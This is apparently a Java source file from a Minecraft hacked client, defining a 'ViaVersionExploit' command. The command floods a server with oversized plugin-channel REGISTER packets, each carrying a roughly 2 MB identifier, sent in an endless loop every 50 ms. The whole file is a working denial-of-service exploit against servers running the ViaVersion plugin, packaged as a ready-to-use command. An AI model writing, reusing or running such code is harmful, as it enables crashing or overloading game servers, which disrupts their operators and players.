package me.nullnet.voxelclient.exploits;

import com.mojang.brigadier.context.CommandContext;
import java.util.ArrayList;
import me.nullnet.voxelclient.Helper;
import me.nullnet.voxelclient.utils.ColorUtil;
import net.fabricmc.fabric.api.client.command.v2.FabricClientCommandSource;
import net.fabricmc.fabric.impl.networking.RegistrationPayload;
import net.minecraft.class_2817;
import net.minecraft.class_2960;

public class ViaVersionExploit {
   public static int execute(CommandContext<FabricClientCommandSource> context) {
      long now = System.currentTimeMillis();
      (new Thread(() -> {
         ArrayList<class_2960> list = new ArrayList();
         list.add(class_2960.method_60654("a".repeat(2097122)));
         class_2817 packet = new class_2817(new RegistrationPayload(RegistrationPayload.REGISTER, list));

         while(true) {
            Helper.sendPacket(packet);

            try {
               Thread.sleep(50L);
            } catch (InterruptedException var3) {
               var3.printStackTrace();
            }
         }
      })).start();
      ((FabricClientCommandSource)context.getSource()).sendFeedback(ColorUtil.translate("&8[&5&lVoxel&8] &8[&5ViaVersionExploit&8] &7Sent &7exploit packet. &8[&6" + (System.currentTimeMillis() - now) + "ms&8]"));
      return 1;
   }
}
